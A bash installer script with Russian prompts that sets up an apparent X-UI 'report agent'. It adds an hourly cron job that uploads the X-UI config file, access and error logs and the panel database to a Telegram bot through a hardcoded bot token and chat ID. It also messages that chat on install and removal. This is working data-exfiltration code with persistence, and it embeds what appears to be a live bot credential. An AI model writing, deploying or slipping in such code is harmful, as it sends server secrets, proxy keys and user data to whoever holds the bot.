#!/bin/bash

BOT_TOKEN="6602514727:AAF7d2iEQmH5YbynKSZH-lPA9-BDUNmjphY"
CHAT_ID="382094545"

INSTALL_DIR="/usr/local/bin"
SEND_SCRIPT="$INSTALL_DIR/send_xui_report.sh"
CRON_JOB="0 * * * * $SEND_SCRIPT"

menu() {
  echo "Выберите действие:"
  echo "1. Установить"
  echo "2. Удалить"
  read -p "> " choice
  case "$choice" in
    1) install ;;
    2) uninstall ;;
    *) echo "Неверный выбор"; exit 1 ;;
  esac
}

install() {
  read -p "Введите название сервера: " SERVER_NAME
  read -p "Введите задержку перед отправкой (в секундах): " DELAY

  # Создаём отправляющий скрипт
  cat > "$SEND_SCRIPT" <<EOF
#!/bin/bash
sleep $DELAY

send_file() {
  FILE="\$1"
  CAPTION="\$2"
  [[ -f "\$FILE" ]] || return
  curl -s -F chat_id=$CHAT_ID \\
       -F document=@\${FILE} \\
       -F caption="📡 *$SERVER_NAME* — \$CAPTION" \\
       -F parse_mode=Markdown \\
       https://api.telegram.org/bot$BOT_TOKEN/sendDocument > /dev/null
}

send_file "/usr/local/x-ui/bin/config.json" "⚙️ Конфигурация"
send_file "/usr/local/x-ui/access.log" "📜 Access Log"
send_file "/usr/local/x-ui/error.log" "❗ Error Log"
send_file "/etc/x-ui/x-ui.db" "💾 База данных"
EOF

  chmod +x "$SEND_SCRIPT"

  # Добавляем в крон
  (crontab -l 2>/dev/null; echo "$CRON_JOB") | grep -v "^$" | sort -u | crontab -

  # Уведомление об установке
  curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
    -d chat_id="$CHAT_ID" \
    -d text="✅ Установлен агент на *$SERVER_NAME*. Задержка: ${DELAY}s" \
    -d parse_mode=Markdown > /dev/null

  # Мгновенная отправка файлов
  bash "$SEND_SCRIPT"
}

uninstall() {
  crontab -l 2>/dev/null | grep -v "$SEND_SCRIPT" | crontab -
  rm -f "$SEND_SCRIPT"
  curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
    -d chat_id="$CHAT_ID" \
    -d text="🗑️ Агент X-UI удалён с сервера" \
    > /dev/null
  echo "✅ Удалено"
}

menu
